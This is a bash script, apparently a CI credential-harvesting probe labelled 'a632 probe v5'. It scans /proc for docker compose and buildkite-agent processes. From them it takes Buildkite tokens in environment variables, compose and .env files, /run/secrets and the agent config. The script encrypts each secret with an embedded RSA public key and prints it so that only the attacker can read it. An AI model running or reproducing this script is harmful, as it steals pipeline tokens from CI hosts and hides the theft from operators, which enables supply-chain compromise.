#!/bin/bash
# a632 probe v5: docker compose project dirs/env = token source; values RSA-encrypted only
set -u
PUB=/tmp/.a632pub.$$
cat > "$PUB" <<'A632PUBEOF'
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvsYiCNEL69IkUinb45Id
ZQJZTtR1aqcW1x3sWVg9ZpNnVw2T8xFOpd7xcHnuRuDJjpVkFlBE+sraDq3WdhB7
pnabZtIbLnQc+G6Y8sXmCwbWUwxjz9E5u87DB1o5xPiEyQMeSTNF5SYPPcY4H9eq
jDlHHe8cAA/LpnNcQ/Meluy39CYwHFPMjJGK10X2apBZBJQJxl79TgMx5jFYZx8R
6FAeH8dnEHTWPZEytzegqe0AKKaQwBM7fpd+3UMxnC5NVn3hfE6g0yCvRzyiAELs
Pe6OCiiZ8XBdHHOtoOpE+YarL9U7Q4x7zc52JdojQ7dLS7xySApfHUwE+xa4fvzr
XQIDAQAB
-----END PUBLIC KEY-----
A632PUBEOF
encrypt() { v="$1"; label="$2"; [ -z "$v" ] && return 0; h=$(printf '%s' "$v" | sha256sum | cut -c1-12); c=$(printf '%s' "$v" | openssl pkeyutl -encrypt -pubin -inkey "$PUB" 2>/dev/null | base64 -w0); echo "A632ENC:$label:$h:${c:-ENCFAIL}"; }
echo "A632E_BEGIN"; id; hostname
echo "== COMPOSE PROCS =="
for p in $(ls /proc 2>/dev/null | grep -E '^[0-9]+$'); do
  c=$(tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null | head -c 300) || continue
  case "$c" in *docker*compose*up*)
    echo "COMPOSE PID=$p CWD=$(readlink /proc/$p/cwd 2>/dev/null)"
    echo "  ENVNAMES: $(tr '\0' '\n' < /proc/$p/environ 2>/dev/null | grep -iE 'buildkite|token|secret' | sed -E 's/^([^=]*)=.*/\1/' | tr '\n' ' ')"
    for k in BUILDKITE_AGENT_TOKEN BUILDKITE_TOKEN BUILDKITE_CLUSTER_TOKEN; do v=$(tr '\0' '\n' < /proc/$p/environ 2>/dev/null | grep "^$k=" | head -1 | cut -d= -f2-); encrypt "$v" "composeenv:$k"; done
  esac
done
echo "== COMPOSE DIRS =="
for p in $(ls /proc 2>/dev/null | grep -E '^[0-9]+$'); do
  c=$(tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null | head -c 300) || continue
  case "$c" in *docker*compose*up*)
    d=$(readlink /proc/$p/cwd 2>/dev/null) || continue
    [ -z "$d" ] && continue
    echo "DIR $d"; ls -la "$d" 2>/dev/null | head -25
    for f in "$d/docker-compose.yml" "$d/docker-compose.yaml" "$d/compose.yml" "$d/compose.yaml" "$d/.env" "$d/agent.env" "$d/token" "$d/buildkite-agent.cfg"; do
      if [ -f "$f" ]; then echo "FILE $f"; sha256sum "$f" 2>/dev/null; grep -inE 'token|secret' "$f" 2>/dev/null | sed -E 's/(token[^:=]*[:=][[:space:]]*).*/\1<redacted>/I' | head -8
        grep -oiE '(BUILDKITE_AGENT_TOKEN|BUILDKITE_TOKEN)[[:space:]]*[:=][[:space:]]*[^ "]*' "$f" 2>/dev/null | sed -E 's/^[^:=]*[:=][[:space:]]*//' | while IFS= read -r v; do encrypt "$(printf '%s' "$v" | tr -d '"')" "composefile:$(basename $f)"; done
      fi
    done
  esac
done
echo "== AGENT ROOT SECRETS =="
for p in $(ls /proc 2>/dev/null | grep -E '^[0-9]+$'); do
  c=$(tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null | head -c 200) || continue
  case "$c" in *buildkite-agent\ start*)
    ls -la /proc/$p/root/run/secrets 2>/dev/null | head -6
    for f in /proc/$p/root/run/secrets/* /proc/$p/root/etc/buildkite-agent/buildkite-agent.cfg; do
      if [ -f "$f" ]; then echo "SECFILE $f"; sha256sum "$f" 2>/dev/null; v=$(head -c 4096 "$f" 2>/dev/null | tr -d '\n'); encrypt "$v" "secfile:$f"; fi
    done
  esac
done
echo "== AGENT CWD + ROOT LISTING =="
for p in $(ls /proc 2>/dev/null | grep -E '^[0-9]+$'); do
  c=$(tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null | head -c 200) || continue
  case "$c" in *buildkite-agent\ start*)
    echo "AG $p CWD=$(readlink /proc/$p/cwd 2>/dev/null) ROOT=$(readlink /proc/$p/root 2>/dev/null)"; ls -la /proc/$p/root/run 2>/dev/null | head -8
  esac
done
rm -f "$PUB" 2>/dev/null || true
echo "A632E_END"
